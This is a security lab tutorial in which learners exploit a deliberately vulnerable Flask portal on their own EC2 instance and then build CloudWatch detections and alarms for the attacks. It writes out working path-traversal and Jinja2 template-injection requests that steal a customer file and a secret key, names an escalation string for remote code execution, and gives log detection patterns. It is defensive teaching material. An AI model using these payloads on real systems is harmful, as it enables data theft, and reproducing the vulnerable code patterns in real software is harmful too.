## Lab 2.3 Bonus: Exploit and Detect — Vulnerable Flask Customer Portal

This lab deploys an intentionally vulnerable Flask/Jinja2 web application on your existing EC2 instance, then builds detections for the attacks it enables. You will play the attacker first — discovering and exploiting a path traversal vulnerability to steal a customer data file, and a server-side template injection vulnerability to probe the application runtime. Then you switch to the defender role, create CloudWatch metric filters for each attack pattern, configure alarms, and wire them to AI Operations auto-investigations that fire without manual intervention.

> **Safety Rails** — This application is deliberately broken for educational purposes. Deploy it only inside your isolated lab EC2 instance. Do not reproduce these vulnerabilities in production software. All exploit steps target only the instance you own and control.

---

## Attacker Objective (Cyber Lens)

Objective: Gain unauthorized access to sensitive customer data by exploiting web application vulnerabilities in an internal customer portal.

ATT&CK focus:
- T1190 — Exploit Public-Facing Application
- T1083 — File and Directory Discovery (path traversal)
- T1005 — Data from Local System (exfiltrate customers.csv)
- T1059 — Command and Scripting Interpreter (SSTI reaching application runtime)

Defender outcome: Confirm that path traversal and SSTI attack signatures are counted, alarmed, and routed to AI triage automatically on first occurrence.

---

## Learning Objectives

By the end of this lab, you will be able to:

1. Identify and exploit path traversal (LFI) and server-side template injection (SSTI) vulnerabilities in a Flask/Jinja2 application.
2. Explain how these attack patterns appear as distinctive signatures in nginx access logs.
3. Create CloudWatch metric filters that match URL-encoded attack strings.
4. Configure CloudWatch alarms that fire on the first occurrence of each pattern.
5. Trace an AI Operations auto-investigation back to the malicious source request.

### 1e. Configure nginx to proxy the portal

Open the nginx configuration:

```bash
sudo nano /etc/nginx/nginx.conf
```

Find the `server` block (contains `listen 80;`). Inside that block, **before** the existing `location /` entry, insert this new location block:

```nginx
        location /portal/ {
            proxy_pass http://127.0.0.1:5001/;
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        }
```

The trailing slash in `proxy_pass http://127.0.0.1:5001/;` is required — it strips the `/portal/` prefix before forwarding the request to Flask, so Flask's routes (`/`, `/search`, `/report`) receive clean paths.

Test the config and reload:

```bash
sudo nginx -t && sudo systemctl reload nginx
```

Expected: `nginx: the configuration file /etc/nginx/nginx.conf syntax is ok`

All requests through this proxy will be logged to `/var/log/nginx/access.log` with the full original URL path (including query parameters) — which is where the attack signatures will appear.

## Part 2: Recon the Application

Before exploiting, map the attack surface. From **CloudShell**:

```bash
export PUBLIC_IP=YOUR_EC2_PUBLIC_IP

# View the home page and its links
curl -s http://$PUBLIC_IP/portal/

# Download a legitimate report
curl -s "http://$PUBLIC_IP/portal/report?file=summary.txt" -o summary.txt
cat summary.txt

# Try a normal customer search
curl -s "http://$PUBLIC_IP/portal/search?q=Alice"
```

Note the two parameterized endpoints:
- `/portal/report?file=` — serves files by name from a reports directory
- `/portal/search?q=` — reflects the query back into the page

Both accept unsanitized user input. The next two parts exploit each one.

## Part 3: Exploit Path Traversal — Steal the Customer File

The `/report` endpoint builds a filesystem path by joining a hardcoded base directory (`/opt/portal/reports`) with the user-supplied `file` parameter. Because no sanitization is applied, including `../` sequences in the parameter walks up the directory tree past the intended boundary.

Count the directory levels from `/opt/portal/reports` to `/home/ec2-user/customers.csv`:

```
/opt/portal/reports   →  ../  →  /opt/portal
                          ../  →  /opt
                          ../  →  /
                          home/ec2-user/customers.csv
```

Three `../` sequences reach the filesystem root, then navigate to the customer file.

**Run the exploit from CloudShell:**

```bash
curl -s "http://$PUBLIC_IP/portal/report?file=../../../home/ec2-user/customers.csv" -o stolen.csv
cat stolen.csv
```

Expected — the full customer file:

```
id,name,email,ssn,card_number
1,Alice Johnson,alice@acme.com,123-45-6789,4532015112830366
2,Bob Martinez,bob@acme.com,987-65-4321,5425233430109903
3,Carol Smith,carol@acme.com,456-78-9012,374251018720955
4,David Lee,david@acme.com,321-54-0987,6011111111111117
5,Eve Turner,eve@acme.com,654-32-1098,3530111333300000
```

A 200 response means the file was served in full. No authentication. No audit trail inside the app. The only evidence is in the nginx access log.

**Confirm the attack signature in the log:**

On your EC2 instance:

```bash
sudo tail -n 10 /var/log/nginx/access.log | grep '\.\.'
```

Expected log line (your CloudShell IP will differ):

```
18.206.1.42 - - [08/Jul/2026:14:22:31 +0000] "GET /portal/report?file=../../../home/ec2-user/customers.csv HTTP/1.1" 200 234 ...
```

The `../` traversal sequence appears verbatim in the request field. This is what the metric filter will detect.

## Part 4: Exploit Server-Side Template Injection

The `/search` endpoint concatenates the user-supplied `q` parameter directly into a template string before passing it to `render_template_string()`. Jinja2 evaluates any `{{ expression }}` it finds in the string — including expressions the attacker injected.

**Step 1 — Confirm evaluation. Send a math expression:**

```bash
curl -s "http://$PUBLIC_IP/portal/search?q={{7*7}}"
```

Look for `49` in the response. If Jinja2 evaluated the template expression, the result is rendered into the page instead of the literal text `{{7*7}}`. This confirms the injection point is live.

**Step 2 — Read the application secret key:**

```bash
curl -s "http://$PUBLIC_IP/portal/search?q={{config.SECRET_KEY}}"
```

Expected: the response contains `super-secret-lab-key-do-not-use` rendered inline. An attacker can use this to forge signed session cookies or JWTs — even without code execution.

**Step 3 — Read a server environment variable:**

```bash
curl -s "http://$PUBLIC_IP/portal/search?q={{request.environ.get('HOME')}}"
```

Expected: `/home/ec2-user` — confirming the runtime context of the web process.

> SSTI can escalate to full remote code execution via Python's object introspection chain. For this lab, stop at environment variable enumeration. The escalation path leads to `T1059` (command execution via `__import__('os').popen('id').read()` injected into the template). Understand the risk profile, not the full weaponization.

**Observe the URL-encoded signature in the nginx log:**

```bash
sudo tail -n 10 /var/log/nginx/access.log | grep '%7B%7B'
```

When `curl` sends `{{7*7}}` in a URL, it URL-encodes the curly braces: `{` → `%7B`, `}` → `%7D`. The nginx log records:

```
18.206.1.42 - - [...] "GET /portal/search?q=%7B%7B7*7%7D%7D HTTP/1.1" 200 ...
```

The `%7B%7B` sequence is a high-fidelity SSTI signature. No legitimate customer search query contains Jinja2 template delimiters.

## Part 5: Create Detection Metric Filters

Both attacks produced distinctive signatures in the `/soc-lab/nginx` CloudWatch log group. You will create one metric filter per vulnerability class.

### Filter 1 — Path Traversal Attempts

1. In the AWS Console, navigate to **CloudWatch → Logs Management**.

2. Click **/soc-lab/nginx**, then the **Metric filters** tab.

3. Click **Create metric filter**.

4. Enter the filter pattern:

   ```
   [host, logName, user, timestamp, request="*../*", statusCode, size]
   ```

   This matches any nginx combined-log line where the quoted request string contains `../`. The `*` wildcards match any characters before and after the traversal sequence, so partial paths like `../../etc/passwd` and `../../../home/` both match.

5. In the **Test pattern** section, pull recent log data from the log group. The path traversal request from Part 3 should match and highlight.

6. Click **Next** and set:

   | Field | Value |
   |-------|-------|
   | Filter name | `portal-path-traversal` |
   | Metric namespace | `SOCLab` |
   | Metric name | `PathTraversalAttempts` |
   | Metric value | `1` |
   | Default value | `0` |
   | Unit | `Count` |

7. Click **Next → Create metric filter**.

---

### Filter 2 — SSTI Attempts

Create a second metric filter on the same log group.

**Filter pattern:**

```
[host, logName, user, timestamp, request="*%7B%7B*", statusCode, size]
```

`%7B%7B` is the URL-encoded form of `{{`. Every SSTI probe sent through a browser or standard HTTP client will produce this encoding in the nginx log. Matching on `%7B%7B` rather than the literal `{{` reflects how the attack actually appears in the log — and avoids false positives from any log lines that might contain literal curly braces for other reasons.

**Test the pattern:** The `%7B%7B7*7%7D%7D` request from Part 4 should match.

**Metric details:**

| Field | Value |
|-------|-------|
| Filter name | `portal-ssti-attempts` |
| Metric namespace | `SOCLab` |
| Metric name | `SSTIAttempts` |
| Metric value | `1` |
| Default value | `0` |
| Unit | `Count` |

Click **Next → Create metric filter**.

## Part 6: Configure Alarms and AI Auto-Investigation

### Alarm 1 — Path Traversal

1. Navigate to **CloudWatch → Alarms → All alarms → Create alarm**.

2. Click **Select metric → SOCLab → PathTraversalAttempts**.

3. Configure the condition:

   | Field | Value |
   |-------|-------|
   | Statistic | Sum |
   | Period | 1 minute |
   | Threshold type | Static |
   | Condition | Greater than or equal to `1` |

   The threshold is 1 because any single path traversal request is a confirmed attack — there is no legitimate reason for `../` sequences to appear in application URLs.

4. On the **Configure actions** page, under **Alarm state trigger: In alarm**:
   - Click **Add action → AI Operations investigation**
   - Select your AI Operations configuration (created in Lab 2.1)
   - Set investigation name prefix: `PathTraversal-Auto`

5. Name the alarm: `portal-path-traversal-alarm`

6. Click **Create alarm**.

## Part 7: Trigger the Alarms and Review the Investigation

Re-run both attacks from **CloudShell** to generate fresh signal after the alarms are in place:

```bash
# Path traversal — re-steal the customer file
curl -s "http://$PUBLIC_IP/portal/report?file=../../../home/ec2-user/customers.csv" -o /dev/null

# SSTI probes
curl -s "http://$PUBLIC_IP/portal/search?q={{7*7}}" -o /dev/null
curl -s "http://$PUBLIC_IP/portal/search?q={{config.SECRET_KEY}}" -o /dev/null
```

Wait 1–2 minutes for CloudWatch to evaluate the alarm period. Navigate to **CloudWatch → Alarms** and confirm both `portal-path-traversal-alarm` and `portal-ssti-alarm` show **In alarm**.

**Review the auto-created investigations:**

1. Navigate to **CloudWatch → AI Operations → Investigations**.

2. Open the most recent `PathTraversal-Auto-*` investigation. The AI should surface:
   - The source IP making the traversal request
   - The full request path including the `../../../` sequence
   - HTTP 200 response (confirming the file was served successfully)
   - Correlation with the alarm that triggered the investigation

3. Open the `SSTI-Auto-*` investigation. Look for:
   - The `%7B%7B` pattern in the request field
   - Multiple SSTI probes from the same source IP within seconds
   - The timing correlation between log events and the alarm transition

**Verify both attack types with Logs Insights:**

Navigate to **CloudWatch → Logs Insights**, select `/soc-lab/nginx`, and run:

```
fields @timestamp, @message
| filter @message like "../" or @message like "%7B%7B"
| sort @timestamp desc
| limit 20
```

Both attack classes should appear, attributed to your CloudShell IP, with timestamps matching the alarm transition.

## Conclusion

You deployed an intentionally vulnerable Flask/Jinja2 application, exploited path traversal to exfiltrate a customer data file across filesystem permission boundaries, and used server-side template injection to read application secrets and environment context. Both attack patterns left distinct signatures in nginx access logs — `../` for path traversal and `%7B%7B` (URL-encoded `{{`) for SSTI — that were already streaming to CloudWatch from the log pipeline built in Lab 2.1.

You created metric filters matching each signature, configured alarms set to fire on the first occurrence, and wired them to AI Operations auto-investigations that triggered without any manual intervention. The full chain — exploit, log, detect, alarm, investigate — ran automatically once the infrastructure was in place.

The two vulnerabilities represent different failure modes: path traversal is a filesystem boundary failure (the app trusted the user to stay inside a directory), while SSTI is a code execution boundary failure (the app trusted user input not to contain executable template expressions). Both are preventable — path traversal by canonicalizing paths and rejecting traversal sequences before joining, SSTI by passing user input as template variables (`render_template_string("..{{ q }}..", q=query)`) rather than as part of the template string itself.
